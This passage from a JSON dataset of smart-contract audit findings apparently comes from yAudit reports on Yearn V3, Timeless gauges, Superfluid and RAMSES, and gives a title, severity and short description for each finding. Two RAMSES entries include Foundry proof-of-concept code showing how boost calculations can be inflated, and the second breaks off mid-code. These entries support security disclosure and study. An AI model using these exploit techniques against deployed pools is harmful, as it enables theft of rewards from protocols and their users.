        "body": "losses_user_share: uint256 = assets_needed - assets_needed * strategy_assets / strategy_current_debt The calculation is done with a loss of precision, it should be rounded up instead of down. yearn",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Potential fund loss due to missing zero address check",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "The lack of a zero address check on the receiver could lead to unintentional loss of funds. If the receiver address were mistakenly set to the zero address, the transferred funds would be irretrievably lost. Given that this function appears to handle fund withdrawal, this could potentially lead to a significant loss. https://github.com/yearn/yearn-vaults-v3/blob/3e51c08d88d2764b39348c98f20e18c51b475722/contracts/VaultV3.vy#L802",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Update debt does not check that strategy is active",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "The update_debt() function does not check that the given strategy is currently active (i.e. self.strategies[strategy].activation != 0).",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Cache storage variable locally to prevent multiple reads from storage",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "VaultV3.vy#L328 VaultV3.vy#L334 VaultV3.vy#L838 VaultV3.vy#L1329",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Don't initialize variables with default value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "VaultV3.vy#L294",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Function can be marked external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "on the TokenizedStrategy.sol contract, several functions can be marked external. TokenizedStrategy.sol#L587 TokenizedStrategy.sol#L599 TokenizedStrategy.sol#L615 TokenizedStrategy.sol#L1355 TokenizedStrategy.sol#L1404 TokenizedStrategy.sol#L1450 TokenizedStrategy.sol#L1482 TokenizedStrategy.sol#L1509 TokenizedStrategy.sol#L1536",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Use != 0 instead of > 0 for comparison",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "TokenizedStrategy.sol#L878 TokenizedStrategy.sol#L885 TokenizedStrategy.sol#L897 TokenizedStrategy.sol#L911 TokenizedStrategy.sol#L915 TokenizedStrategy.sol#L925 TokenizedStrategy.sol#L934 TokenizedStrategy.sol#L942 TokenizedStrategy.sol#L1340",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Use unchecked for subtractions where the operands cannot underflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "TokenizedStrategy.sol#L1065 TokenizedStrategy.sol#L1073 VaultV3.vy#L304 VaultV3.vy#L309 VaultV3.vy#L310 VaultV3.vy#L378 VaultV3.vy#L533 VaultV3.vy#L581 VaultV3.vy#L695 VaultV3.vy#L889 VaultV3.vy#L897 VaultV3.vy#L950 VaultV3.vy#L1025 VaultV3.vy#L1028 VaultV3.vy#L1329",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Vyper 0.3.8 introduces transient storage for non-reentrancy checks, leading to notable gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "yearn vault",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Unnecessary return variable declaration",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "BaseTokenizedStrategy.sol",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Use constants for literal or magic values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "TokenizedStrategy.sol#L1302 TokenizedStrategy.sol#L1302",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Prefer abi.encodeCall() over abi.encodeWithSignature() or abi.encodeWithSelector()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "BaseTokenizedStrategy.sol#L433",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Optional ERC-20 functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "VaultV3.vy#L280 TokenizedStrategy.sol#L383 TokenizedStrategy.sol#L1366",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Typos in tokenized-strategy repo",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Vyper raw_call() can be replaced with the new vyper default_return syntax",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "The existing codebase uses low-level raw_call to handle non-standard ERC20 calls. This can be simplified using the new syntax.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Selector clashing attack in strategies",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "The current design of strategies is composed of two contracts, an abstract BaseTokenizedStrategy.sol contract inherited by strategist and a TokenizedStrategy.sol contract that implements the vault's core logic. Communication between the two is done using delegatecall. Similar to the proxy pattern, the main strategy contract uses a fallback() function to delegatecall any non-matching function to the TokenizedStrategy.sol contract. Since function selectors are 4 bytes long, it is feasible to mine a function signature that matches one of the functions in the TokenizedStrategy.sol contract. A bad actor can then hide such a function in the strategy implementation that will be unintentionally called while trying to access the \"real\" function. Due to the current contract design, this function will be caught by the strategy implementation instead of being delegated to the TokenizedStrategy.sol contract, as function dispatch will happen first in the main strategy contract.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Lack of event logging in tend()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "TokenizedStrategy.sol#L1051",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Lack of event logging in emergencyWithdraw()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "TokenizedStrategy.sol#L1122",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. VeBeacon contract vulnerable to denial of service",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "The following code reverts when ETH is left on the contract. if (address(this).balance != 0) revert VeBeacon__LeftoverEth(); This ensures users don't overpay for the Arbitrum bridge, but it has two issues: An attacker will be able to DOS the contract by sending some ETH dust that will remain, causing the check to revert. A user might get his transaction reverted because the Arbitrum fee might change between the time the transaction is broadcasted and the time it gets executed. VeBeacon.sol#L66",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Potential denial of service vulnerability in bridger contracts",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "When a user tries to bridge tokens like USDT that doesn't return a boolean value on transferFrom() and approve() function calls, the operation will fail since the Bridger contracts use the assert statement to validate the function call's success. In Vyper, the assert function throws an exception if the condition is unmet and reverts all changes.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Child gauge vulnerability: uncontrolled reward addition by managers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "Refer to ChildGauge.vy#L579 for the relevant code snippet.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. unkillGauge should checkpoint funds distribution to prevent distributing for the time it was killed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "The function unkillGauge() merely changes the gauge state flag to active. User reward claims will trigger a checkpoint that will distribute rewards for the period up until the last checkpoint, which was set when the gauge was 'killed'. Consequently, this distributes rewards corresponding to the duration in which the pool was inactive.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Potential user exploitation of boost adjustment mechanism",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "The function at ChildGauge.vy#L699 sets a new boost value. While a 'kick' function exists, it cannot be utilized to update a user's effective balance. The kick() method can only be used when the user has updated a lock.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Rewards can be locked in Gauges",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "childGuage.vy function deposit_reward_token allows anyone to create, and rewards distribution is done using the reward rate. Still, if the reward distributor deposits _amount (in WEI) less than 1 WEEK (or 604800 Wei), the transferred rewards will be locked into the contract. self.reward_data[_reward_token].rate = _amount / WEEK If _amount < 604800 then self.reward_data[_reward_token].rate = 0.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Add missing input validation on constructor/initializer/setters",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "Certain functions are missing necessary input validation. In childGaugeFactory.vy: set_implementation, set_voting_escrow, deploy_gauge, and __init__. In childGuage.vy: __init__, add_reward, set_manager, initialize.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Potential user manipulation of Uniswap deposit to claim rewards within range",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "For more information, refer to ChildGauge.vy#L744.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. votingEscrow.epoch() can't be zero if a user created a lock",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "The following code snippet is not necessary: if (epoch == 0) revert VeBeacon__EpochIsZero(); This check is redundant as a validation already exists in line 117. If a user has created a lock, the global epoch cannot be zero, as confirmed in the ve contract. VeBeacon.sol#L122",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Consolidating Gauge State Setters for Gas Optimization",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "Multiple setters are currently used to modify the gauge_state value. To optimize gas usage, it is recommended to consolidate these setters into a single function.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Potential transaction order discrepancy and impact on total supply calculation in sidechain",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "There is no warranty on transaction ordering from L1 to L2. A transaction can be mined on L1, fail on L2, and then be retried later, resulting in a different order. Here is an example: User A creates a lock that will last for 4 years. User A broadcasts their lock to L2. User B creates a lock that will last two weeks. User B broadcasts their lock to L2. If the broadcast from User B is processed by L2 before the one from User A, then the slope changes corresponding to the end of the lock from User B will be removed from the corresponding variable when User A's transaction is processed on L2.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Optimizing bytecode size by removing unused constant variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "There is an unused constant variable in the contract childGaugeFactory.vy that should be removed.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Missing events for critical operations",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "Ideally, the following critical operations should trigger events. In VeRecipient constructor() should emit SetBeacon In childGuage, following function lacks event emission. killGauge() unkillGauge() makeGaugePermissionless() set_manager() deposit_reward_token() kick() set_reward_distributor() add_reward() claim_rewards() set_rewards_receiver() In rootGuage, following functions lacks event emission. set_killed()",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Leveraging new syntax in Vyper 0.3.4 for default return value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-timeless-gauges.md",
        "body": "The existing codebase uses low-level raw_calls for safe calls. This can be simplified using the new syntax.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. decodeCtx() missing error checks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. No function to unregister an agreement class",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. App registration front-running can set a different configword",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. appCallbackPop() missing modifier",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Unnecessary zero initialization",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Avoid && logic in require statements",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Use != 0 for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Use short require strings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. External functions are cheaper than public functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Use Solidity errors in 0.8.4+",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Use prefix in loops",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Declare constant internal when possible",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Use of memory for function arguments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Unnecessary variable computation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Shorted revert strings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Custom error",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Using >0 for unsigned integers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Unchecked counter incrementation in \"for\" loop",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Potential underflow condition",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Potential hash collision",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Logic inconsistency between callAgreementWithContext() and callAppActionWithContext()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Upgradable Superfluid.sol has hardcoded version",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. _callAppAction() logic varies from _callAgreement()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Use named cached variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. _replacePlaceholderCtx() logic could be simplified",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. _callCallback() logic can be simplified",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Broken link",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. FIXME or TODO comments remain in code",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Typos",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. Incorrect external code reference",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Match callInfo masks and shifts to data size",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. isConfigWordClean doesn't check some unused bits",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Remove unnecessary casting to ISuperApp type",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Incorrect comments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Variation in isTrustedForwarder() implementations",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Implementation contracts not initialized",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "Superfluid, SuperfluidAgreement, SuperTokenFactory are deployed as UUPS proxy contracts. Anyone call their initialize() function as implementation contracts are not initialized.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Possible to register multiple apps with same registrationKey",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "Governance's owner can call setConfig() to allow an address a (hashed into key) to register a SuperApp with Superfluid.sol (host). The value parameter is the timestamp until which the address can register the app. a can initiate a transaction to register multiple apps through registerAppWithKey() as long as block.timestamp <= value.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Valid context is not checked before modifying it",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "For reference, appCallbackPush() has asserts a valid context through assertValidCtx(ctx). There is no such verification for appCallbackPop().",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Typo",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "agreeement (Superfluid.sol#L1053 and Superfluid.sol#L1063) might be better spelled as agreement.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Ambiguous endian of bitmap",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Add more comments and documentation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Superfluid.md",
        "body": "There is NatSpec on the interface ISuperfluid.sol but still lacking on documentation and inline comments.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Minting with different position indices yields a higher total boostAmount than minting with the same index",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "When minting or burning the liquidityDelta is added to an existing position's liquidity to determine the newLiquidity which is used throughout _updatePosition() for various calculations, to include the veRamRatio and newBoostedLiquidity. Eventually a boostedLiquidityCap is calculated using the veRamRatio and hypotheticalLiquidity. This boostedLiquidityCap is intended to limit the amount of newBoostedLiquidity that can be added by a position. However, this can be bypassed by using many small positions rather than the same position. This can be done relatively simply by an attacker by using a different index for their positions, and since a veRamTokenId balance can be re-used by multiple positions, there is no detriment to using multiple positions to mint liquidity. See this POC illustrating the point in code: contract AttachTest is Test { RamsesV2Pool _pool; RamsesV2Factory _factory; MockVoter _voter; MockNFPManager _nfpManager; MockVotingEscrow _veRam; MockERC20 _token0; MockERC20 _token1; function setUp() public { _pool = new RamsesV2Pool(); _factory = new RamsesV2Factory(); _voter = new MockVoter(); _nfpManager = new MockNFPManager(); _veRam = new MockVotingEscrow(); _token0 = new MockERC20(\"0\", \"token_0\", 18); _token1 = new MockERC20(\"1\", \"token_1\", 18); deal(address(_token0), address(this), type(uint256).max); deal(address(_token1), address(this), type(uint256).max); _factory.initialize(address(_nfpManager), address(_veRam), address(_voter), address(0)); _pool.initialize(address(_factory), address(_nfpManager), address(_veRam), address(_voter), address(_token0), address(_token1), 10_000, 200); _pool.initialize(393495975901102234655829); } function ramsesV2MintCallback( uint256 amount0Owed, uint256 amount1Owed, bytes calldata data ) external { _token0.transfer(address(_pool), amount0Owed); _token1.transfer(address(_pool), amount1Owed); } function positionHash( address owner, uint256 index, int24 tickLower, int24 tickUpper ) internal pure returns (bytes32) { return keccak256(abi.encodePacked(owner, index, tickLower, tickUpper)); } function testMultipleAttachmentPOC() public { uint256 period = block.timestamp / (1 weeks); ( uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint8 feeProtocol, bool unlocked ) = _pool.slot0(); int24 tickLower = tick - 132; int24 tickUpper = tick + 68; // get the boostAmount when using the same index to repeatedly mint for (uint i = 0; i < 10; i++) { _pool.mint(address(this), 0, tickLower, tickUpper, 100, 1, \"\"); } (uint128 boostAmountMintingSameIndex,,,) = _pool.boostInfos(period, positionHash(address(this), 0, tickLower, tickUpper)); // clear out all the state from this minting such that it doesn't affect the minting below. In essence, the two operations should functional independently of one another. _pool.burn(0, tickLower, tickUpper, 100 * 10, 1); _pool.collect(address(this), tickLower, tickUpper, uint128(_token0.balanceOf(address(_pool))), uint128(_token1.balanceOf(address(_pool)))); vm.startPrank(address(_pool)); _token0.transfer(address(this), _token0.balanceOf(address(_pool))); // clear the fee balances _token1.transfer(address(this), _token1.balanceOf(address(_pool))); vm.stopPrank(); skip(1 weeks); // skip forward a week to ensure the prior period's `totalVeRamAmount` doesn't affect this period's. period = period + 1; // get the boostAmount when using different indices to repeatedly mint uint128 boostAmountMintingDifferentIndices; for (uint i = 0; i < 10; i++) { _pool.mint(address(this), i+1, tickLower, tickUpper, 100, 2, \"\"); // the VotingEscrow contract is hard coded to return the same balanceOfNFT for every tokenId to illustrate the point. (uint128 boostAmountAccumulator,,,) = _pool.boostInfos(period, positionHash(address(this), i+1, tickLower, tickUpper)); boostAmountMintingDifferentIndices += boostAmountAccumulator; } // the boostAmount of all the differently indexed positions is > the boost amount when using the same position supplying the same liquidity assertGt(uint(boostAmountMintingDifferentIndices), uint(boostAmountMintingSameIndex)); } } Note that the pool in the POC has been initialized similarly to the deployed DEUS/USDC pool which can be found here. Also, note that the MockVotingEscrow contract has been hard coded to return the same balanceOfNFT() (the balance taken from the deployed veRAM contract for tokenId 1 at the time of the test) and isApproverOrOwner() for ease of testing and to illustrate the difference between the two minting strategies. function isApprovedOrOwner(address, uint256) external override view returns (bool) { return true; } function balanceOfNFT(uint256) external override view returns (uint256) { return 21487469130353205716474214; }",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Treasury fees can be bypassed with repeated calls to notifyRewardAmount()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Protocol fees are collected in the pushFees modifier when notifyRewardAmount() in GaugeV2.sol is called, which can be called by anyone at any time. FeeCollector.sol contract's collectProtocolFees() collects the pool's protocol fees and then uses the amount retrieved from the pool to calculate the treasury fee amount.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. boostAmount stays attached to a position after ownership is lost",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "When a veRamTokenId is attached to a position there is a check to ensure that the msg.sender isApprovedOrOwner of the veRamTokenId. If this check passes, the balance of the NFT is attached to the boostedPosition. However, if the ownership of the veRamTokenId changes, or the position owner is no longer approved, this veRamAmount stays attached to the boostedPosition indefinitely unless the veRamTokenId is explicitly changed, or the liquidity of the position goes to 0.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Minting, burning, and minting yields higher boostAmount than minting",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "When minting a new position, the pool's token balances are used to determine hypotheticalLiquidity and therefore the boostedLiquidityCap, veRamBoostAvailable, and positionBoostUsedRatio. However, when a position is burned, the tokens continue to accrue to the pool until collect() is called by the burner. This means that even though the tokens may be allocated to the burner, and they can retrieve them at any time, they continue to contribute to the boostedLiquidityCap, veRamBoostAvailable, and positionBoostUsedRatio variables when positions are updated. This means that boostedLiquidityCap and veRamBoostAvailable can be inflated, and positionBoostUsedRatio deflated, to any value an attacker would like without supplying additional liquidity. See this POC illustrating the point in code: contract AttachTest is Test { RamsesV2Pool _pool; RamsesV2Factory _factory; MockVoter _voter; MockNFPManager _nfpManager; MockVotingEscrow _veRam; MockERC20 _token0; MockERC20 _token1; function setUp() public { _pool = new RamsesV2Pool(); _factory = new RamsesV2Factory(); _voter = new MockVoter(); _nfpManager = new MockNFPManager(); _veRam = new MockVotingEscrow(); _token0 = new MockERC20(\"0\", \"token_0\", 18); _token1 = new MockERC20(\"1\", \"token_1\", 18); deal(address(_token0), address(this), type(uint256).max); deal(address(_token1), address(this), type(uint256).max); vm.label(address(_pool), \"_pool\"); 